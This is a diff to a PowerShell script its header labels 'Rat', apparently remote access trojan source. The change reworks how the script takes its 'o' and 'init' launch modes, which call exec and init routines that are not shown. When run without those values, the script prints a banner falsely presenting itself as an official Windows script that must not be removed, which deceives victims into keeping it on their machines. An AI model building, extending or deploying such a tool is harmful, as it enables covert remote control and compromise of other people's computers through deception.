@@ -1,10 +1,13 @@
+param (
+    [string]$run
+)
 ####################################################################################################
 # Authors: github.com/NetConnectors
 # Description: Rat
 ####################################################################################################
 
 #Check if the script is running with params
-if ($args.Count -eq 0 -or $args[0] -ne "/o" -and $args[0] -ne "/init") {
+if ($run -ne "o" -and $run -ne "init") {
     Write-Host "###############################################"
     Write-Host "# This is an official Windows Script          #"
     Write-Host "# DO NOT REMOVE/MODIFY THIS FILE!             #"
@@ -41,10 +44,10 @@ function exec {
 function main {
     $ProgressPreference = 'SilentlyContinue'
     Startup
-    if ($args[0] -eq "/init") {
+    if ($run -eq "init") {
         init
     } 
-    if ($args[0] -eq "/o") {
+    if ($run -eq "o") {
         exec
     }
 
